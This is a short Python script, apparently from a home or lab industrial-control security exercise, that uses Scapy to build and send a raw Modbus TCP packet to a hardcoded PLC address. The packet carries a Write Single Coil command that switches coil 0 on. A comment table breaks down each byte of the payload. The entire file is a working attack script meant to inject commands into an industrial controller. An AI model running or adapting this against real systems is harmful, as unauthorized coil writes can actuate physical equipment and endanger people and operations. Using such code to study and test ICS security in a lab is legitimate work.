#Libraries
from scapy.all import *
from scapy.layers.inet import *

# Hardcoded values: PLC (RPI)
MODBUS_SERVER_IP = "192.168.68.117"
MODBUS_PORT = 502

"""
Modbus TCP Replay Payload
Unit ID: 1, Function: 0x05 (Write Single Coil), Coil Address: 0x0000, Value: 0xFF00 (ON)
Building payload: MBAP header + PDU
b' => indicates its in bytes
| Bytes (Hex) | Field          | Value          |
| ----------- | -------------- | -------------- |
| `00 01`     | Transaction ID | 1              |
| `00 00`     | Protocol ID    | 0              |
| `00 06`     | Length         | 6 bytes (rest) |
| `01`        | Unit ID        | 1              |
| Bytes (Hex) | Meaning                         |
| ----------- | --------------------------------|
| `05`        | Function code: Write Single Coil|
| `00 00`     | Coil address: 0                 |
| `FF 00`     | Value: `0xFF00` =   Turn ON     |
"""

modbus_payload = b'\x00\x01\x00\x00\x00\x06\x01\x05\x00\x00\xff\x00'

# Build a fake TCP/IP packet with the payload
packet = IP(dst=MODBUS_SERVER_IP)/TCP(dport=MODBUS_PORT, sport=RandShort(), flags="PA")/Raw(load=modbus_payload)

# Send packet
send(packet, verbose=1)
